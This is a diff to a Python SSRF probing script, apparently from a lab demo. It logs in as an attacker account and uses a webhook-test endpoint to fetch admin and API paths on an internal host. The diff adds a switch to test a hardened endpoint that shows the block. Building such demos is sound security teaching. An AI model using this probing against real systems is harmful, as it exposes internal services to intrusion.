@@ -25,6 +25,8 @@ USER, PASSWORD = "joao", "senha123"  # conta comum do atacante
 TARGET = "10.5.0.15:8080"            # host:porta interno a sondar
 # ==========================================================================
 
+MODE = "vulnerable"  # trocado para "secure" com --secure
+
 COMMON_PATHS = [
     "/", "/health", "/status",
     "/admin", "/admin/accounts", "/api", "/api/accounts",
@@ -44,7 +46,7 @@ def login() -> str:
 def ssrf_get(token: str, url: str, timeout: float = 10.0) -> dict:
     start = time.perf_counter()
     try:
-        r = httpx.post(f"{APP_URL}/vulnerable/webhook/test", json={"url": url},
+        r = httpx.post(f"{APP_URL}/{MODE}/webhook/test", json={"url": url},
                        headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
         data = r.json().get("request", {})
     except Exception as exc:  # noqa: BLE001
@@ -96,5 +98,9 @@ def main(target):
 if __name__ == "__main__":
     ap = argparse.ArgumentParser(description="Sondagem de caminhos de um serviço interno via SSRF.")
     ap.add_argument("--target", default=TARGET, help="host:porta interno")
+    ap.add_argument("--secure", action="store_true",
+                    help="testa contra /secure/webhook/test (mostra o bloqueio)")
     a = ap.parse_args()
+    if a.secure:
+        MODE = "secure"
     main(a.target)
